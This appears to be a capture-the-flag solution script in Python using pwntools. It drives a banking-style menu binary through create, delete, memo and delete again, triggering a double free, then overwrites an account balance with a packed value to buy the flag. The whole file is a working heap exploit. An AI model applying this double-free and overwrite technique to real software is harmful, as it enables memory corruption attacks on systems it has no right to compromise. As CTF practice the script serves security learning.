from pwn import *
needed_balance = 0x6b637566
# stupid helper functions, pay no mind


def make_account(first, last):
    print("1")
    print(first)
    print(last)


def del_account():
    print("3")


def add_memo(memo):
    print("4")
    print(memo)


def display_account():
    print("2")


make_account("chad", "lad")  # make initial account
del_account()  # goes into unsorted
add_memo("nice")  # strdup will have internal functions that will remove the account from the unsorted bin
del_account()  # double free, next malloc will be where the account is in memory
add_memo("A" * 48 + p32(needed_balance))  # strdup will best fit the new chunk to the account
display_account()
print("5")  # buy flag
